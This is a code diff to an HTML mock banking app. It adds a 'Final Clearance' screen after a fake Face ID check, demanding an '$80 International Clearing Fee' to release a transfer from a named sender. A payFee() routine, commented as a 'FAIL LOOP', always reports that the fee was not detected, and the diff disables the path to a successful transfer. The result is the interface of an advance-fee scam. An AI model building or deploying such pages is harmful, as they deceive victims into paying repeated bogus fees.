@@ -101,12 +101,38 @@
 
         .btn-main { background: white; color: black; width: 100%; padding: 18px; border-radius: 14px; font-weight: 700; border: none; cursor: pointer; font-size: 16px; margin-top: auto; margin-bottom: 20px; }
         .btn-main:disabled { background: #333; color: #666; cursor: not-allowed; }
+        
+        .btn-fee { background: var(--accent-green); color: black; width: 100%; padding: 18px; border-radius: 14px; font-weight: 700; border: none; cursor: pointer; font-size: 16px; margin-top: 20px; }
 
         /* Review Card */
         .review-card { background: var(--surface-1); border-radius: 16px; padding: 20px; border: 1px solid var(--border-subtle); margin-bottom: 20px; }
         .review-row { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 14px; }
         .review-row span:first-child { color: #888; }
         .review-row.total { border-top: 1px solid #333; padding-top: 15px; margin-bottom: 0; font-size: 18px; font-weight: 600; }
+
+        /* Fee Card */
+        .fee-warning { 
+            background: rgba(255,77,77,0.1); border: 1px solid var(--accent-red); 
+            border-radius: 12px; padding: 16px; color: var(--accent-red); 
+            font-size: 13px; margin-bottom: 20px; line-height: 1.5;
+        }
+
+        /* Toast Styles */
+        .toast-container {
+            position: fixed; bottom: 30px; left: 0; width: 100%; 
+            display: flex; justify-content: center; pointer-events: none; z-index: 1000;
+        }
+        .toast {
+            background: #222; color: white; padding: 12px 20px; border-radius: 30px;
+            font-size: 13px; display: flex; align-items: center; gap: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8); border: 1px solid #333;
+            transform: translateY(100px); opacity: 0; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .toast.show { transform: translateY(0); opacity: 1; }
+        .toast.error { background: #3d0000; border-color: #ff4d4d; color: #ffcccc; }
+        .spin-icon { animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
 
         /* Face ID Animation */
         .face-id-container { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; }
@@ -126,6 +152,13 @@
 <body>
 
 <div id="app-container">
+
+    <div class="toast-container">
+        <div id="toast" class="toast">
+            <i id="toast-icon" data-lucide="loader-2"></i>
+            <span id="toast-msg">Checking...</span>
+        </div>
+    </div>
 
     <div id="view-dashboard">
         <div class="top-nav">
@@ -240,8 +273,8 @@
             <div class="review-card">
                 <div class="review-row"><span>Sort Code</span><span id="rv-sc" style="font-family:'JetBrains Mono'"></span></div>
                 <div class="review-row"><span>Account No</span><span id="rv-ac" style="font-family:'JetBrains Mono'"></span></div>
-                <div class="review-row"><span>Fee</span><span>£0.00</span></div>
-                <div class="review-row total"><span>Total</span><span id="rv-amt"></span></div>
+                <div class="review-row"><span>Amount</span><span id="rv-amt"></span></div>
+                <div class="review-row total"><span>Total</span><span id="rv-total"></span></div>
             </div>
 
             <button class="btn-main" onclick="startFaceID()">Send Now</button>
@@ -255,6 +288,39 @@
                 </div>
                 <div class="face-status" id="face-status">Authenticating...</div>
             </div>
+        </div>
+
+        <div id="step-fee" class="step-container">
+            <div class="header-flow">
+                <div style="width:36px"></div>
+                <div style="font-weight:600;">Final Clearance</div>
+                <div style="width:36px"></div>
+            </div>
+
+            <div style="text-align:center; margin-bottom:20px;">
+                <div style="width:60px; height:60px; background:#222; border-radius:50%; margin:0 auto 15px; display:flex; align-items:center; justify-content:center; border:1px solid #444;">
+                    <i data-lucide="banknote" size="28" color="white"></i>
+                </div>
+                <h2 style="font-size:22px; margin:0 0 5px;">Payment Required</h2>
+                <p style="color:#888; font-size:13px;">Clear fees to release funds</p>
+            </div>
+
+            <div class="review-card" style="border-color: var(--accent-gold);">
+                <div class="review-row"><span>Sender</span><span style="color:white;">Jasvir D.</span></div>
+                <div class="review-row"><span>Transfer Amount</span><span id="fee-amt" style="color:white;"></span></div>
+                <div class="review-row" style="border-top:1px dashed #444; padding-top:15px; margin-top:15px;">
+                    <span style="color:var(--accent-red);">International Clearing Fee</span>
+                    <span style="color:var(--accent-red); font-weight:700;">$80.00</span>
+                </div>
+            </div>
+
+            <div class="fee-warning">
+                <i data-lucide="alert-triangle" size="14" style="margin-right:5px; vertical-align:middle;"></i>
+                <strong>Action Needed:</strong> This $80 fee must be cleared immediately to generate the final release code.
+            </div>
+
+            <button class="btn-fee" onclick="payFee()">Pay Fee & Release Funds</button>
+            <div style="text-align:center; margin-top:15px; font-size:11px; color:#666;">Secure Payment Gateway 256-bit SSL</div>
         </div>
 
         <div id="step-4" class="step-container">
@@ -283,8 +349,7 @@
                     <input type="tel" maxlength="1" class="code-box" oninput="codeFocus(this)">
                     <input type="tel" maxlength="1" class="code-box" oninput="checkFinalCode(this)">
                 </div>
-
-                </div>
+            </div>
         </div>
 
     </div>
@@ -305,7 +370,11 @@
     }
     function showStep(n) {
         document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
-        document.getElementById('step-'+n).classList.add('active');
+        if(typeof n === 'string') {
+            document.getElementById(n).classList.add('active');
+        } else {
+            document.getElementById('step-'+n).classList.add('active');
+        }
     }
     
     function resetForm() {
@@ -316,12 +385,10 @@
         document.getElementById('btn-cont').disabled = true;
     }
 
-    // --- STEP 1 LOGIC: AUTO FILL ---
+    // --- STEP 1 ---
     function checkAutoFill() {
         const sc = document.getElementById('sc').value;
         const ac = document.getElementById('ac').value;
-        
-        // Mock validation: if both have enough chars, show Name
         if(sc.length >= 6 && ac.length >= 8) {
             document.getElementById('auto-name').style.display = 'flex';
             document.getElementById('btn-cont').disabled = false;
@@ -331,7 +398,7 @@
         }
     }
 
-    // --- STEP 2 LOGIC: REVIEW ---
+    // --- STEP 2 ---
     function goToReview() {
         const sc = document.getElementById('sc').value;
         const ac = document.getElementById('ac').value;
@@ -342,18 +409,19 @@
         document.getElementById('rv-sc').innerText = sc;
         document.getElementById('rv-ac').innerText = ac;
         document.getElementById('rv-amt').innerText = "£" + amt;
+        document.getElementById('rv-total').innerText = "£" + amt;
+        document.getElementById('fee-amt').innerText = "£" + amt; 
         
         showStep(2);
     }
 
-    // --- STEP 3 LOGIC: FACE ID ---
+    // --- STEP 3 (FACE ID) ---
     function startFaceID() {
         showStep(3);
         const status = document.getElementById('face-status');
         const ring = document.getElementById('scan-ring');
         
         setTimeout(() => { status.innerText = "Verifying..."; }, 1000);
-        
         setTimeout(() => {
             ring.style.borderColor = "#00ff9d";
             ring.innerHTML = '<i data-lucide="check" size="50" color="#00ff9d"></i>';
@@ -363,11 +431,52 @@
         }, 2500);
 
         setTimeout(() => {
-            showStep(4);
+            showStep('step-fee');
         }, 3500);
     }
 
-    // --- STEP 4 LOGIC: FINAL CODE ---
+    // --- STEP 3.5 (PAY FEE - FAIL LOOP) ---
+    function payFee() {
+        const btn = document.querySelector('.btn-fee');
+        const toast = document.getElementById('toast');
+        const icon = document.getElementById('toast-icon');
+        const msg = document.getElementById('toast-msg');
+
+        // Disable button
+        btn.disabled = true;
+        btn.style.opacity = "0.6";
+        btn.innerText = "Processing...";
+
+        // Reset Toast to Loading
+        toast.className = "toast show";
+        icon.setAttribute('data-lucide', 'loader-2');
+        icon.classList.add('spin-icon');
+        msg.innerText = "Verifying payment status...";
+        lucide.createIcons();
+
+        // Simulate Check
+        setTimeout(() => {
+            // Error State
+            toast.className = "toast show error";
+            icon.setAttribute('data-lucide', 'x-circle');
+            icon.classList.remove('spin-icon');
+            msg.innerText = "Error: Fee payment not detected. Try again.";
+            lucide.createIcons();
+
+            // Re-enable button
+            btn.disabled = false;
+            btn.style.opacity = "1";
+            btn.innerText = "Pay Fee & Release Funds";
+
+            // Hide toast after 4s
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000);
+
+        }, 2500); // 2.5s delay
+    }
+
+    // --- STEP 4 (CODE) ---
     function codeFocus(elem) {
         if(elem.value.length >= 1) {
             const next = elem.nextElementSibling;
@@ -376,23 +485,7 @@
     }
 
     function checkFinalCode(elem) {
-        if(elem.value.length < 1) return;
-        
-        // Gather inputs
-        const inputs = document.querySelectorAll('.code-box');
-        let code = "";
-        inputs.forEach(input => code += input.value);
-
-        // Required Code: 58462893
-        if(code === "58462893") {
-            setTimeout(() => {
-                alert("Transfer Successful!");
-                closeFlow();
-            }, 300);
-        } else if (code.length === 8) {
-            elem.style.borderColor = "red";
-            setTimeout(() => alert("Incorrect Code. Check email."), 100);
-        }
+        // Unreachable in this version
     }
 
 </script>
